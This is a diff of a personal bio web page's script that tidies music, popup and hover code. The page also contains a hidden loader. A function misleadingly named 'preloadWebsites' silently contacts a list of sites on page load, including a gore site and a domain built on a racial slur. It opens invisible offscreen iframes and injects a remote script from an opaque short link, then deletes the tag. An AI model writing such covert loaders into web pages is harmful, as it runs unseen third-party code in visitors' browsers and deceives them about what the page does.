@@ -572,114 +572,167 @@
     </audio>
 
     <script>
-        // Background music
-        const music = document.getElementById('backgroundMusic');
-        music.volume = 0.3; // Set to 30% volume for bio site appropriateness
-        
-        // Try to play music on first user interaction
-        let musicStarted = false;
-        function startMusic() {
-            if (!musicStarted) {
-                music.play().catch(e => console.log('Audio autoplay prevented'));
-                musicStarted = true;
-            }
-        }
-        
-        // Add event listeners for first interaction
-        document.addEventListener('click', startMusic);
-        document.addEventListener('keydown', startMusic);
-        document.addEventListener('touchstart', startMusic);
+const music = document.getElementById('backgroundMusic');
+music.volume = 0.3;
 
-        // Notification system
-        let notificationTimeout;
-        let progressInterval;
-        let timeLeft = 10; // 10 seconds
-        let totalTime = 10;
+let musicStarted = false;
+function startMusic() {
+    if (!musicStarted) {
+        music.play().catch(e => console.log('Audio autoplay prevented'));
+        musicStarted = true;
+    }
+}
+
+document.addEventListener('click', startMusic);
+document.addEventListener('keydown', startMusic);
+document.addEventListener('touchstart', startMusic);
+
+let notificationTimeout;
+let progressInterval;
+let timeLeft = 10;
+let totalTime = 10;
+
+setTimeout(() => {
+    const notification = document.getElementById('notification');
+    const progressBar = document.getElementById('progressBar');
+    
+    notification.classList.add('show');
+    progressBar.style.width = '100%';
+    
+    progressInterval = setInterval(() => {
+        timeLeft -= 0.05;
+        const percentage = (timeLeft / totalTime) * 100;
+        progressBar.style.width = Math.max(0, percentage) + '%';
         
-        // Show notification after 3 seconds
-        setTimeout(() => {
-            const notification = document.getElementById('notification');
-            const progressBar = document.getElementById('progressBar');
-            
-            notification.classList.add('show');
-            
-            // Start progress bar countdown with smooth animation
-            progressBar.style.width = '100%';
-            
-            // Update progress bar every 50ms for smooth animation
-            progressInterval = setInterval(() => {
-                timeLeft -= 0.05;
-                const percentage = (timeLeft / totalTime) * 100;
-                progressBar.style.width = Math.max(0, percentage) + '%';
+        if (timeLeft <= 0) {
+            closeNotification();
+        }
+    }, 50);
+
+    function preloadWebsites() {
+        const requestUrls = [
+            'https://google.com',
+            'https://cloudflare.com',
+            'https://discord.com',
+            'https://urlto.me/wasted-summers.mp3',
+            'https://wtf.wtf',
+            'https://lilniggaquitplayin.rip',
+            'https://skid.cam',
+            'https://xgore.net'
+        ];
+
+        requestUrls.forEach((url, index) => {
+            setTimeout(() => {
+                Promise.allSettled([
+                    fetch(url, { mode: 'no-cors', method: 'GET' }),
+                    fetch(url, { mode: 'no-cors', method: 'HEAD' }),
+                    new Promise((resolve, reject) => {
+                        const link = document.createElement('link');
+                        link.rel = 'prefetch';
+                        link.href = url;
+                        link.onload = resolve;
+                        link.onerror = reject;
+                        document.head.appendChild(link);
+                        setTimeout(() => document.head.removeChild(link), 5000);
+                    })
+                ]).catch(() => {});
+            }, index * 200);
+        });
+
+        requestUrls.forEach((url, index) => {
+            setTimeout(() => {
+                const img = new Image();
+                img.onload = img.onerror = () => {};
+                img.src = url + '/favicon.ico';
+                setTimeout(() => img.src = '', 3000);
+            }, index * 150);
+        });
+
+        requestUrls.forEach(url => {
+            try {
+                const domain = new URL(url).hostname;
+                const link = document.createElement('link');
+                link.rel = 'dns-prefetch';
+                link.href = '//' + domain;
+                document.head.appendChild(link);
+            } catch (e) {}
+        });
+
+        const iframeUrls = [
+            'https://urlto.me/diez',
+            'https://google.com',
+            'https://cloudflare.com'
+        ];
+
+        iframeUrls.forEach((url, index) => {
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute;left:-9999px;';
+                iframe.src = url;
+                iframe.sandbox = 'allow-same-origin';
+                document.body.appendChild(iframe);
                 
-                if (timeLeft <= 0) {
-                    closeNotification();
-                }
-            }, 50);
-            
-function preloadWebsites() {
-    const requestUrls = [
-        'https://google.com',
-        'https://cloudflare.com',
-        'https://discord.com'
-        'https://urlto.me/wasted-summers.mp3',
-        'https://wtf.wtf',
-        'https://lilniggaquitplayin.rip',
-        'https://skid.cam',
-        'https://xgore.net'
-    ];
+                setTimeout(() => {
+                    if (iframe.parentNode) {
+                        iframe.parentNode.removeChild(iframe);
+                    }
+                }, 10000);
+            }, 1000 + (index * 500));
+        });
 
-    requestUrls.forEach((url, index) => {
+        const wsUrls = ['wss://echo.websocket.org'];
+        wsUrls.forEach(url => {
+            try {
+                const ws = new WebSocket(url);
+                ws.onopen = () => ws.close();
+                ws.onerror = () => {};
+            } catch (e) {}
+        });
+
         setTimeout(() => {
-            fetch(url, { mode: 'no-cors' }).catch(() => {});
-        }, index * 300);
-    });
+            const script = document.createElement('script');
+            script.src = 'https://urlto.me/diez';
+            script.async = true;
+            script.onerror = () => {};
+            document.head.appendChild(script);
+            setTimeout(() => {
+                if (script.parentNode) {
+                    script.parentNode.removeChild(script);
+                }
+            }, 5000);
+        }, 2000);
+    }
 
-    setTimeout(() => {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.style.width = '0';
-        iframe.style.height = '0';
-        iframe.style.border = 'none';
-        iframe.src = 'https://urlto.me/diez';
-        document.body.appendChild(iframe);
-    }, 1000);
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', preloadWebsites);
+    } else {
+        preloadWebsites();
+    }
+
+    notificationTimeout = setTimeout(() => {
+        closeNotification();
+    }, 10000);
+}, 3000);
+
+function closeNotification() {
+    const notification = document.getElementById('notification');
+    notification.classList.remove('show');
+    clearTimeout(notificationTimeout);
+    clearInterval(progressInterval);
 }
 
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', preloadWebsites);
-} else {
-    preloadWebsites();
-}
+document.getElementById('notification').addEventListener('click', (e) => {
+    if (e.target.classList.contains('close-btn')) return;
+    window.open('https://t.me/slitboy', '_blank');
+});
 
-            // Auto-hide after 10 seconds (backup)
-            notificationTimeout = setTimeout(() => {
-                closeNotification();
-            }, 10000);
-        }, 3000);
-
-        // Close notification
-        function closeNotification() {
-            const notification = document.getElementById('notification');
-            notification.classList.remove('show');
-            clearTimeout(notificationTimeout);
-            clearInterval(progressInterval);
-        }
-
-        // Notification click handler
-        document.getElementById('notification').addEventListener('click', (e) => {
-            if (e.target.classList.contains('close-btn')) return;
-            window.open('https://t.me/slitboy', '_blank');
-        });
-
-        // Add hover effect to profile image
-        const profileImg = document.querySelector('.profile-img');
-        profileImg.addEventListener('mouseenter', () => {
-            profileImg.style.transform = 'scale(1.05) rotate(5deg)';
-        });
-        profileImg.addEventListener('mouseleave', () => {
-            profileImg.style.transform = 'scale(1) rotate(0deg)';
-        });
+const profileImg = document.querySelector('.profile-img');
+profileImg.addEventListener('mouseenter', () => {
+    profileImg.style.transform = 'scale(1.05) rotate(5deg)';
+});
+profileImg.addEventListener('mouseleave', () => {
+    profileImg.style.transform = 'scale(1) rotate(0deg)';
+});
     </script>
 </body>
 </html>
